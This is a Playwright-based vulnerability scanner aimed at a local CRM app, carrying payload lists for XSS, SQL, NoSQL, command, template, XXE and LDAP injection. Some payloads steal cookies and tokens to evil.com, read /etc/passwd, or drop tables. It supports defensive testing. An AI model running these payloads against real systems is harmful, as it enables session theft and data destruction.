const { chromium } = require('playwright');

// XSS and Injection Payloads Collection
const XSS_PAYLOADS = {
  basic: [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "';alert('XSS');//",
    '";alert(\'XSS\');//',
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
    "<svg/onload=alert('XSS')>",
    "<input autofocus onfocus=alert('XSS')>",
    "<select autofocus onfocus=alert('XSS')>",
    "<textarea autofocus onfocus=alert('XSS')>",
    "<keygen autofocus onfocus=alert('XSS')>",
    "<video><source onerror=\"alert('XSS')\">",
    "<audio src=x onerror=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
  ],

  encoded: [
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    "&lt;script&gt;alert('XSS')&lt;/script&gt;",
    "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
    "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
  ],

  filterBypass: [
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    "<script src=data:text/javascript,alert('XSS')></script>",
    "<object data=\"data:text/html,<script>alert('XSS')</script>\">",
    "<embed src=\"data:text/html,<script>alert('XSS')</script>\">",
    "<img src=\"x\" onerror=\"eval(atob('YWxlcnQoJ1hTUycp'))\">",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>",
  ],

  domBased: [
    "#<script>alert('XSS')</script>",
    "?search=<script>alert('XSS')</script>",
    "';alert(document.cookie);//",
    "'-alert(document.domain)-'",
    "\\'-alert(1)//",
    "</script><script>alert('XSS')</script>",
  ],

  storedXSS: [
    "<script>fetch('/api/steal?cookie='+document.cookie)</script>",
    "<img src=x onerror=\"fetch('/api/exfiltrate?data='+btoa(document.body.innerHTML))\">",
    "<script>document.location='http://evil.com?c='+document.cookie</script>",
    "<script>new Image().src='http://evil.com?c='+localStorage.getItem('token')</script>",
  ]
};

const SQL_PAYLOADS = {
  basic: [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "' OR '1'='1' --",
    "admin'--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "'; DROP TABLE users--",
    "' UNION SELECT * FROM users--",
    "1' AND 1=1 UNION ALL SELECT 1,2,3,4,5--",
    "' AND 1=0 UNION SELECT null, table_name FROM information_schema.tables--",
  ],

  timeBasedBlind: [
    "'; WAITFOR DELAY '00:00:05'--",
    "' AND SLEEP(5)--",
    "'; SELECT pg_sleep(5)--",
    "' OR IF(1=1, SLEEP(5), 0)--",
  ],

  errorBased: [
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    "' AND extractvalue(1, concat(0x7e, version()))--",
    "' AND (SELECT * FROM (SELECT COUNT(*), CONCAT(version(), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
  ]
};

const NOSQL_PAYLOADS = {
  basic: [
    "{\"$ne\": null}",
    "{\"$gt\": \"\"}",
    "{\"$regex\": \".*\"}",
    "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
    "{\"$or\": [{}, {\"a\": \"a\"}]}",
    "{\"$where\": \"this.password == 'test'\"}",
    "'; return true; var foo='bar",
  ]
};

const COMMAND_PAYLOADS = [
  "; ls -la",
  "| whoami",
  "& dir",
  "`id`",
  "$(whoami)",
  "; cat /etc/passwd",
  "\"; ls -la; echo \"",
  "'; ls -la; echo '",
  "|ping -c 10 127.0.0.1",
  "; sleep 10",
];

const TEMPLATE_PAYLOADS = [
  "${7*7}",
  "{{7*7}}",
  "<%= 7*7 %>",
  "${{7*7}}",
  "#{7*7}",
  "*{7*7}",
  "@(7*7)",
  "~[7*7]",
  "{{config}}",
  "{{self}}",
  "{{_self.env}}",
  "${T(java.lang.System).getenv()}",
];

const XXE_PAYLOADS = [
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>',
];

const LDAP_PAYLOADS = [
  "*",
  "*)(&",
  "*)(uid=*))(|(uid=*",
  "*)(objectClass=*",
  "*)(mail=*",
  "admin*",
  "admin*)((|userpassword=*)",
  "*)(uid=*))(|(uid=*",
];

class XSSInjectionTester {
  constructor() {
    this.results = {
      vulnerabilities: [],
      testedEndpoints: [],
      timestamp: new Date().toISOString(),
      summary: {
        critical: 0,
        high: 0,
        medium: 0,
        low: 0
      }
    };
  }

  async init() {
    this.browser = await chromium.launch({
      headless: false,
      args: ['--disable-web-security', '--disable-features=IsolateOrigins,site-per-process']
    });
    this.context = await this.browser.newContext({
      ignoreHTTPSErrors: true,
      bypassCSP: true,
      javaScriptEnabled: true
    });

    // Set up console message listener for XSS detection
    this.page = await this.context.newPage();

    // Listen for alerts (XSS success indicator)
    this.page.on('dialog', async dialog => {
      console.log(`🔴 XSS ALERT TRIGGERED: ${dialog.message()}`);
      this.results.vulnerabilities.push({
        type: 'XSS',
        severity: 'CRITICAL',
        message: `XSS payload executed: ${dialog.message()}`,
        timestamp: new Date().toISOString()
      });
      await dialog.dismiss();
    });

    // Listen for console messages
    this.page.on('console', msg => {
      if (msg.text().includes('XSS')) {
        this.results.vulnerabilities.push({
          type: 'XSS',
          severity: 'HIGH',
          message: `Console XSS detection: ${msg.text()}`,
          timestamp: new Date().toISOString()
        });
      }
    });

    // Listen for errors
    this.page.on('pageerror', error => {
      if (error.message.includes('XSS') || error.message.includes('eval')) {
        this.results.vulnerabilities.push({
          type: 'XSS',
          severity: 'HIGH',
          message: `Error-based XSS: ${error.message}`,
          timestamp: new Date().toISOString()
        });
      }
    });
  }

  async testLoginForm() {
    console.log('🎯 Testing Login Form for XSS and Injection...');

    try {
      await this.page.goto('http://localhost:3001/signin', { waitUntil: 'networkidle' });

      // Test email field with XSS payloads
      for (const payload of XSS_PAYLOADS.basic.slice(0, 5)) {
        await this.page.fill('input[name="email"], input[type="email"]', payload);
        await this.page.fill('input[name="password"], input[type="password"]', 'test');
        await this.page.click('button[type="submit"]');
        await this.page.waitForTimeout(1000);

        // Check if payload is reflected in error messages
        const errorText = await this.page.textContent('body');
        if (errorText.includes(payload) || errorText.includes('alert')) {
          this.results.vulnerabilities.push({
            type: 'Reflected XSS',
            severity: 'CRITICAL',
            location: '/signin - email field',
            payload: payload,
            details: 'XSS payload reflected in error message'
          });
        }
      }

      // Test SQL injection
      for (const payload of SQL_PAYLOADS.basic.slice(0, 5)) {
        await this.page.fill('input[name="email"], input[type="email"]', `test@test.com${payload}`);
        await this.page.fill('input[name="password"], input[type="password"]', payload);
        await this.page.click('button[type="submit"]');
        await this.page.waitForTimeout(1000);

        // Look for SQL errors
        const pageContent = await this.page.content();
        if (pageContent.includes('SQL') || pageContent.includes('syntax') || pageContent.includes('database')) {
          this.results.vulnerabilities.push({
            type: 'SQL Injection',
            severity: 'CRITICAL',
            location: '/signin',
            payload: payload,
            details: 'Possible SQL injection - error disclosure'
          });
        }
      }
    } catch (error) {
      console.log(`Error testing login form: ${error.message}`);
    }
  }

  async testRegistrationForm() {
    console.log('🎯 Testing Registration Form for XSS...');

    try {
      await this.page.goto('http://localhost:3001/signup', { waitUntil: 'networkidle' });

      // Test all input fields with XSS
      const fields = ['name', 'email', 'phone', 'organizationName'];

      for (const field of fields) {
        for (const payload of XSS_PAYLOADS.basic.slice(0, 3)) {
          try {
            await this.page.fill(`input[name="${field}"]`, payload);
            await this.page.waitForTimeout(500);

            // Check for immediate execution
            const pageContent = await this.page.content();
            if (pageContent.includes(payload)) {
              this.results.vulnerabilities.push({
                type: 'Stored XSS',
                severity: 'CRITICAL',
                location: `/signup - ${field} field`,
                payload: payload,
                details: 'XSS payload accepted in registration form'
              });
            }
          } catch (e) {
            // Field might not exist
          }
        }
      }
    } catch (error) {
      console.log(`Error testing registration: ${error.message}`);
    }
  }

  async testSearchFunctionality() {
    console.log('🎯 Testing Search Parameters for XSS...');

    // Test URL-based XSS
    const searchEndpoints = [
      '/leads',
      '/customers',
      '/booking',
      '/automations'
    ];

    for (const endpoint of searchEndpoints) {
      for (const payload of XSS_PAYLOADS.domBased) {
        try {
          await this.page.goto(`http://localhost:3001${endpoint}?search=${encodeURIComponent(payload)}`, { waitUntil: 'networkidle' });
          await this.page.waitForTimeout(1000);

          // Check if payload executed
          const pageContent = await this.page.content();
          if (pageContent.includes('alert') || pageContent.includes('script')) {
            this.results.vulnerabilities.push({
              type: 'DOM-based XSS',
              severity: 'HIGH',
              location: `${endpoint} - search parameter`,
              payload: payload,
              details: 'XSS via URL parameter'
            });
          }
        } catch (error) {
          // Endpoint might require auth
        }
      }
    }
  }

  async testAPIEndpoints() {
    console.log('🎯 Testing API Endpoints for Injection...');

    const apiEndpoints = [
      { url: '/api/auth/signin', method: 'POST', body: { email: '', password: '' } },
      { url: '/api/leads', method: 'POST', body: { name: '', email: '', phone: '' } },
      { url: '/api/customers', method: 'POST', body: { name: '', email: '' } },
      { url: '/api/bookings', method: 'POST', body: { type: '', date: '' } },
    ];

    for (const endpoint of apiEndpoints) {
      // Test JSON injection
      for (const payload of NOSQL_PAYLOADS.basic) {
        try {
          const response = await this.page.evaluate(async ({ url, method, payload }) => {
            const res = await fetch(url, {
              method: method,
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ email: payload, password: payload })
            });
            return {
              status: res.status,
              text: await res.text()
            };
          }, { url: endpoint.url, method: endpoint.method, payload });

          if (response.text.includes('error') || response.status === 500) {
            this.results.vulnerabilities.push({
              type: 'NoSQL Injection',
              severity: 'HIGH',
              location: endpoint.url,
              payload: payload,
              details: `Potential NoSQL injection - Status: ${response.status}`
            });
          }
        } catch (error) {
          // API might require auth
        }
      }
    }
  }

  async testFileUpload() {
    console.log('🎯 Testing File Upload for XSS...');

    try {
      // Create malicious files
      const maliciousFiles = [
        { name: '"><script>alert("XSS")</script>.jpg', content: 'test' },
        { name: 'test.svg', content: '<svg onload="alert(\'XSS\')">' },
        { name: 'test.html', content: '<script>alert("XSS")</script>' },
        { name: '../../../etc/passwd', content: 'test' },
      ];

      // Find file upload inputs
      await this.page.goto('http://localhost:3001/settings', { waitUntil: 'networkidle' });
      const fileInputs = await this.page.$$('input[type="file"]');

      for (const input of fileInputs) {
        for (const file of maliciousFiles) {
          try {
            // Test file upload with malicious filenames
            await input.setInputFiles({
              name: file.name,
              mimeType: 'image/jpeg',
              buffer: Buffer.from(file.content)
            });

            await this.page.waitForTimeout(1000);

            // Check for XSS execution
            const pageContent = await this.page.content();
            if (pageContent.includes(file.name) || pageContent.includes('alert')) {
              this.results.vulnerabilities.push({
                type: 'File Upload XSS',
                severity: 'HIGH',
                location: 'File upload',
                payload: file.name,
                details: 'XSS via malicious filename'
              });
            }
          } catch (error) {
            // Upload might fail
          }
        }
      }
    } catch (error) {
      console.log(`Error testing file upload: ${error.message}`);
    }
  }

  async testStoredXSS() {
    console.log('🎯 Testing for Stored XSS in Forms...');

    // Test comment/note fields that might store and display data
    const formsToTest = [
      { url: '/customers/new', fields: ['notes', 'comments', 'description'] },
      { url: '/leads/new', fields: ['notes', 'message'] },
      { url: '/settings/profile', fields: ['bio', 'about'] },
    ];

    for (const form of formsToTest) {
      try {
        await this.page.goto(`http://localhost:3001${form.url}`, { waitUntil: 'networkidle' });

        for (const field of form.fields) {
          for (const payload of XSS_PAYLOADS.storedXSS) {
            try {
              await this.page.fill(`textarea[name="${field}"], input[name="${field}"]`, payload);

              // Try to submit form
              const submitButton = await this.page.$('button[type="submit"]');
              if (submitButton) {
                await submitButton.click();
                await this.page.waitForTimeout(2000);

                // Check if payload was stored and executed
                const pageContent = await this.page.content();
                if (pageContent.includes('fetch') || pageContent.includes('cookie')) {
                  this.results.vulnerabilities.push({
                    type: 'Stored XSS',
                    severity: 'CRITICAL',
                    location: `${form.url} - ${field}`,
                    payload: payload,
                    details: 'Stored XSS - payload persisted and executed'
                  });
                }
              }
            } catch (error) {
              // Field might not exist
            }
          }
        }
      } catch (error) {
        // Page might require auth
      }
    }
  }

  async testTemplateInjection() {
    console.log('🎯 Testing for Template Injection...');

    for (const payload of TEMPLATE_PAYLOADS) {
      try {
        // Test in various input fields
        const response = await this.page.evaluate(async (payload) => {
          const res = await fetch('/api/test', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ template: payload })
          });
          return await res.text();
        }, payload);

        // Check if template was evaluated
        if (response.includes('49') || response.includes('config') || response.includes('env')) {
          this.results.vulnerabilities.push({
            type: 'Template Injection',
            severity: 'CRITICAL',
            location: 'Template rendering',
            payload: payload,
            details: 'Server-side template injection detected'
          });
        }
      } catch (error) {
        // Expected errors
      }
    }
  }

  async testHTTPHeaderInjection() {
    console.log('🎯 Testing HTTP Headers for Injection...');

    const headers = [
      'User-Agent',
      'Referer',
      'X-Forwarded-For',
      'X-Real-IP',
      'X-Originating-IP',
      'X-Forwarded-Host',
      'X-Frame-Options'
    ];

    for (const header of headers) {
      for (const payload of XSS_PAYLOADS.basic.slice(0, 3)) {
        try {
          await this.context.setExtraHTTPHeaders({
            [header]: payload
          });

          await this.page.goto('http://localhost:3001/', { waitUntil: 'networkidle' });

          // Check if header value is reflected
          const pageContent = await this.page.content();
          if (pageContent.includes(payload)) {
            this.results.vulnerabilities.push({
              type: 'Header Injection',
              severity: 'MEDIUM',
              location: `HTTP Header: ${header}`,
              payload: payload,
              details: 'XSS via HTTP header injection'
            });
          }
        } catch (error) {
          // Continue testing
        }
      }
    }

    // Reset headers
    await this.context.setExtraHTTPHeaders({});
  }

  async testCookieInjection() {
    console.log('🎯 Testing Cookie Injection...');

    try {
      // Set malicious cookies
      await this.context.addCookies([
        {
          name: 'xss',
          value: '<script>alert("XSS")</script>',
          domain: 'localhost',
          path: '/'
        },
        {
          name: 'session',
          value: "'; alert('XSS'); //",
          domain: 'localhost',
          path: '/'
        }
      ]);

      await this.page.goto('http://localhost:3001/', { waitUntil: 'networkidle' });

      // Check if cookies are reflected unsafely
      const pageContent = await this.page.content();
      if (pageContent.includes('alert') || pageContent.includes('script')) {
        this.results.vulnerabilities.push({
          type: 'Cookie Injection',
          severity: 'MEDIUM',
          location: 'Cookie handling',
          details: 'XSS via cookie injection'
        });
      }
    } catch (error) {
      console.log(`Error testing cookies: ${error.message}`);
    }
  }

  async testWebSocketInjection() {
    console.log('🎯 Testing WebSocket for Injection...');

    try {
      await this.page.goto('http://localhost:3001/', { waitUntil: 'networkidle' });

      // Inject into WebSocket if present
      const wsTest = await this.page.evaluate(() => {
        const sockets = [];
        const originalWebSocket = window.WebSocket;

        window.WebSocket = function(...args) {
          const ws = new originalWebSocket(...args);
          sockets.push(ws);

          // Try to send malicious payload
          ws.addEventListener('open', () => {
            ws.send('<script>alert("XSS")</script>');
            ws.send('{"$ne": null}');
          });

          return ws;
        };

        return sockets.length > 0;
      });

      if (wsTest) {
        this.results.vulnerabilities.push({
          type: 'WebSocket Injection',
          severity: 'HIGH',
          location: 'WebSocket connection',
          details: 'WebSocket accepts unvalidated input'
        });
      }
    } catch (error) {
      // WebSocket might not be present
    }
  }

  generateReport() {
    // Count vulnerabilities by severity
    this.results.vulnerabilities.forEach(vuln => {
      const severity = vuln.severity?.toLowerCase() || 'low';
      if (this.results.summary[severity] !== undefined) {
        this.results.summary[severity]++;
      }
    });

    // Generate report
    console.log('\n' + '='.repeat(80));
    console.log('🔒 XSS AND INJECTION VULNERABILITY REPORT');
    console.log('='.repeat(80));
    console.log(`📅 Timestamp: ${this.results.timestamp}`);
    console.log(`🎯 Target: http://localhost:3001`);
    console.log('\n📊 SUMMARY:');
    console.log(`  🔴 Critical: ${this.results.summary.critical}`);
    console.log(`  🟠 High: ${this.results.summary.high}`);
    console.log(`  🟡 Medium: ${this.results.summary.medium}`);
    console.log(`  🟢 Low: ${this.results.summary.low}`);
    console.log('\n' + '='.repeat(80));
    console.log('VULNERABILITIES FOUND:');
    console.log('='.repeat(80));

    if (this.results.vulnerabilities.length === 0) {
      console.log('✅ No vulnerabilities found');
    } else {
      this.results.vulnerabilities.forEach((vuln, index) => {
        console.log(`\n${index + 1}. ${vuln.type} [${vuln.severity}]`);
        console.log(`   Location: ${vuln.location || 'N/A'}`);
        if (vuln.payload) {
          console.log(`   Payload: ${vuln.payload.substring(0, 100)}...`);
        }
        console.log(`   Details: ${vuln.details || 'N/A'}`);
      });
    }

    console.log('\n' + '='.repeat(80));
    console.log('RECOMMENDATIONS:');
    console.log('='.repeat(80));
    console.log('1. Implement Content Security Policy (CSP)');
    console.log('2. Use DOMPurify for all user input sanitization');
    console.log('3. Implement parameterized queries for database operations');
    console.log('4. Validate and escape all user input server-side');
    console.log('5. Use secure coding frameworks and libraries');
    console.log('6. Regular security audits and penetration testing');
    console.log('7. Implement input validation on both client and server');
    console.log('8. Use httpOnly and secure flags on cookies');
    console.log('='.repeat(80));

    return this.results;
  }

  async cleanup() {
    await this.browser.close();
  }
}

// Main execution
(async () => {
  console.log('🚀 Starting XSS and Injection Vulnerability Scanner...');
  console.log('🎯 Target: Atlas Fitness CRM (http://localhost:3001)');
  console.log('⚠️  WARNING: This is for authorized testing only!\n');

  const tester = new XSSInjectionTester();

  try {
    await tester.init();

    // Run all tests
    await tester.testLoginForm();
    await tester.testRegistrationForm();
    await tester.testSearchFunctionality();
    await tester.testAPIEndpoints();
    await tester.testFileUpload();
    await tester.testStoredXSS();
    await tester.testTemplateInjection();
    await tester.testHTTPHeaderInjection();
    await tester.testCookieInjection();
    await tester.testWebSocketInjection();

    // Generate and save report
    const report = tester.generateReport();

    // Save results to file
    const fs = require('fs');
    fs.writeFileSync('xss-injection-report.json', JSON.stringify(report, null, 2));
    console.log('\n📄 Full report saved to: xss-injection-report.json');

  } catch (error) {
    console.error('❌ Test execution failed:', error);
  } finally {
    await tester.cleanup();
  }
})();